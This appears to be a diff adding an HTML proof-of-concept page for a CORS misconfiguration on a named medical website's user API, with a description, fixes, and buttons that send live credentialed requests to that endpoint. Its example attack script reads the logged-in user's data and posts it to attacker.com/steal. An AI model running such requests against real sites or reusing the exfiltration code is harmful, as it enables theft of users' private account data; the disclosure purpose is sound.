@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebMD CORS Vulnerability PoC</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 2em; max-width: 1000px; }
+        .container { background: #f8f9fa; border-radius: 8px; padding: 2em; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #d32f2f; border-bottom: 2px solid #d32f2f; padding-bottom: 10px; }
+        h2 { color: #1976d2; margin-top: 1.5em; }
+        .warning { background: #fff3cd; border: 1px solid #ffecb5; color: #856404; padding: 1em; border-radius: 4px; margin: 1em 0; }
+        .info { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 1em; border-radius: 4px; margin: 1em 0; }
+        code { background: #e9ecef; padding: 2px 6px; border-radius: 3px; font-family: 'Consolas', monospace; }
+        pre { background: #2d2d2d; color: #f8f8f2; padding: 1em; border-radius: 5px; overflow-x: auto; }
+        button { background: #1976d2; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin: 5px; }
+        button:hover { background: #1565c0; }
+        #result { background: white; border: 1px solid #ddd; padding: 1em; margin: 1em 0; white-space: pre-wrap; font-family: 'Consolas', monospace; font-size: 0.9em; }
+        .success { color: #28a745; }
+        .error { color: #dc3545; }
+        .section { margin-bottom: 2em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 WebMD CORS Misconfiguration Vulnerability</h1>
+        <p><strong>Target:</strong> <code>https://www.webmd.com/api/reg/regapi.svc/secure/json2/user</code></p>
+        
+        <div class="warning">
+            <strong>⚠️ SECURITY WARNING:</strong> This page demonstrates a security vulnerability. Do not use for malicious purposes.
+            This is a proof-of-concept for educational and responsible disclosure only.
+        </div>
+        
+        <div class="section">
+            <h2>📋 Vulnerability Description</h2>
+            <p>The WebMD API endpoint is configured with:</p>
+            <ul>
+                <li><code>Access-Control-Allow-Origin: *</code> (any domain can make requests)</li>
+                <li><code>Access-Control-Allow-Credentials: true</code> (requests can include cookies/sessions)</li>
+            </ul>
+            <p>This combination violates the CORS security model and allows malicious websites to make authenticated requests to WebMD and read sensitive user data.</p>
+        </div>
+        
+        <div class="section">
+            <h2>🔍 Test CORS Configuration</h2>
+            <p>Test the CORS headers returned by the WebMD API:</p>
+            <button onclick="testCors()">Test Basic CORS</button>
+            <button onclick="testCorsWithCredentials()">Test CORS with Credentials</button>
+            <button onclick="testOptions()">Test OPTIONS Preflight</button>
+            
+            <div id="result">Click a test button to see results...</div>
+        </div>
+        
+        <div class="section">
+            <h2>🎯 Attack Scenario</h2>
+            <div class="info">
+                <strong>How an attacker would exploit this:</strong>
+                <ol>
+                    <li>User logs into WebMD (gets session cookies)</li>
+                    <li>User visits a malicious website</li>
+                    <li>Malicious site runs JavaScript that makes a request to WebMD API</li>
+                    <li>Browser sends cookies automatically (credentials: 'include')</li>
+                    <li>Malicious site reads the response containing user's sensitive data</li>
+                    <li>Data is exfiltrated to attacker's server</li>
+                </ol>
+            </div>
+            
+            <h3>Example Attack Code:</h3>
+            <pre>
+// Malicious JavaScript on attacker.com
+fetch('https://www.webmd.com/api/reg/regapi.svc/secure/json2/user', {
+    method: 'GET',
+    credentials: 'include',  // Sends WebMD session cookies
+    headers: {
+        'Authorization': 'Bearer [user_token]',
+        'Client-Id': '63bc91e1-0492-46eb-bb4a-042d6c924c4b',
+        'Enc-Data': '[encrypted_data]',
+        'Timestamp': '[timestamp]'
+    }
+})
+.then(response => response.json())
+.then(userData => {
+    // Send stolen data to attacker server
+    fetch('https://attacker.com/steal', {
+        method: 'POST',
+        body: JSON.stringify(userData)
+    });
+});
+            </pre>
+        </div>
+        
+        <div class="section">
+            <h2>🛡️ Recommended Fix</h2>
+            <ul>
+                <li><strong>Option 1:</strong> Remove <code>Access-Control-Allow-Credentials: true</code> if using wildcard origin</li>
+                <li><strong>Option 2:</strong> Replace wildcard origin with specific allowed origins (whitelist)</li>
+                <li><strong>Option 3:</strong> Implement proper authentication and CSRF tokens for API requests</li>
+                <li><strong>Option 4:</strong> Consider if CORS is needed at all for this endpoint</li>
+            </ul>
+        </div>
+    </div>
+    
+    <script>
+        function log(msg) {
+            document.getElementById('result').textContent += msg + '\n';
+        }
+        
+        function clearLog() {
+            document.getElementById('result').textContent = '';
+        }
+        
+        function testCors() {
+            clearLog();
+            log('🧪 Testing CORS without credentials...\n');
+            fetch('https://www.webmd.com/api/reg/regapi.svc/secure/json2/user', {
+                method: 'GET',
+                headers: {
+                    'Authorization': 'Bearer test',
+                    'Client-Id': '63bc91e1-0492-46eb-bb4a-042d6c924c4b',
+                    'Enc-Data': 'test',
+                    'Timestamp': '1775956814'
+                },
+                mode: 'cors'
+            })
+            .then(response => {
+                log(`📊 Status: ${response.status} ${response.statusText}\n`);
+                log('📨 Response Headers:');
+                let corsHeadersFound = false;
+                response.headers.forEach((value, key) => {
+                    if (key.toLowerCase().includes('access-control')) {
+                        log(`  ${key}: ${value}`);
+                        corsHeadersFound = true;
+                    }
+                });
+                if (!corsHeadersFound) {
+                    log('  (No CORS headers found)');
+                }
+                return response.text();
+            })
+            .then(text => {
+                log(`\n📄 Response Preview: ${text.substring(0, 300)}...`);
+            })
+            .catch(error => {
+                log(`❌ Error: ${error}`);
+            });
+        }
+        
+        function testCorsWithCredentials() {
+            clearLog();
+            log('🧪 Testing CORS WITH credentials (credentials: include)...\n');
+            fetch('https://www.webmd.com/api/reg/regapi.svc/secure/json2/user', {
+                method: 'GET',
+                headers: {
+                    'Authorization': 'Bearer test',
+                    'Client-Id': '63bc91e1-0492-46eb-bb4a-042d6c924c4b',
+                    'Enc-Data': 'test',
+                    'Timestamp': '1775956814'
+                },
+                mode: 'cors',
+                credentials: 'include'
+            })
+            .then(response => {
+                log(`📊 Status: ${response.status} ${response.statusText}\n`);
+                log('📨 Response Headers:');
+                let corsHeadersFound = false;
+                response.headers.forEach((value, key) => {
+                    if (key.toLowerCase().includes('access-control')) {
+                        log(`  ${key}: ${value}`);
+                        corsHeadersFound = true;
+                    }
+                });
+                if (!corsHeadersFound) {
+                    log('  (No CORS headers found)');
+                }
+                return response.text();
+            })
+            .then(text => {
+                log(`\n📄 Response Preview: ${text.substring(0, 300)}...`);
+            })
+            .catch(error => {
+                log(`❌ Error: ${error}`);
+            });
+        }
+        
+        function testOptions() {
+            clearLog();
+            log('🧪 Testing OPTIONS preflight request...\n');
+            fetch('https://www.webmd.com/api/reg/regapi.svc/secure/json2/user', {
+                method: 'OPTIONS',
+                headers: {
+                    'Origin': 'https://shieldcore.be',
+                    'Access-Control-Request-Method': 'GET',
+                    'Access-Control-Request-Headers': 'authorization,client_id,enc_data,timestamp'
+                }
+            })
+            .then(response => {
+                log(`📊 Status: ${response.status} ${response.statusText}\n`);
+                log('📨 Response Headers:');
+                let corsHeadersFound = false;
+                response.headers.forEach((value, key) => {
+                    if (key.toLowerCase().includes('access-control')) {
+                        log(`  ${key}: ${value}`);
+                        corsHeadersFound = true;
+                    }
+                });
+                if (!corsHeadersFound) {
+                    log('  (No CORS headers found)');
+                }
+            })
+            .catch(error => {
+                log(`❌ Error: ${error}`);
+            });
+        }
+    </script>
+</body>
+</html>
